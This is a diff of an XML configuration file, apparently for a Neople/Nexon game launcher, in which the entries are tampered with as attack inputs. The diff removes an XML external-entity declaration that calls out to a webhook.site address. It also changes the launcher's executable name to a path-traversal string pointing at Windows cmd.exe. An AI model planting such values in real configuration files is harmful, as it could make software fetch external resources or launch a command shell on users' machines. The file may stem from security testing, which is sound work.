@@ -1,6 +1,4 @@
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE root [<!ENTITY test SYSTEM 'https://webhook.site/1695dbb6-9336-44c7-af26-b89d06394fcc'>]>
-<root>&test;</root>
 <Neople>
   <Nexon>
     <Real>
@@ -33,7 +31,7 @@
       <RegistryName>DNF</RegistryName>
       <DefaultInstallPath>DNF</DefaultInstallPath>
       <VendorName>Candybar</VendorName>
-      <ExecuteFileName>DnF.exe</ExecuteFileName>
+      <ExecuteFileName>..\\..\\Windows\System32\cmd.exe</ExecuteFileName>
       <LauncherFileName>NeopleLauncher.exe</LauncherFileName>
       <LauncherChecksum>250, 224, 202, 211, 51, 177, 100, 163, 114, 176, 175, 15, 14, 179, 99, 73, 0, 98, 57, 123, 131, 58, 222, 243, 249, 20, 243, 215, 205, 146, 59, 219</LauncherChecksum>
       <InstallerChecksum>88, 46, 112, 182, 187, 211, 3, 161, 173, 118, 185, 173, 211, 162, 214, 243, 121, 227, 89, 7, 167, 24, 192, 103, 136, 168, 21, 97, 93, 62, 92, 247</InstallerChecksum>
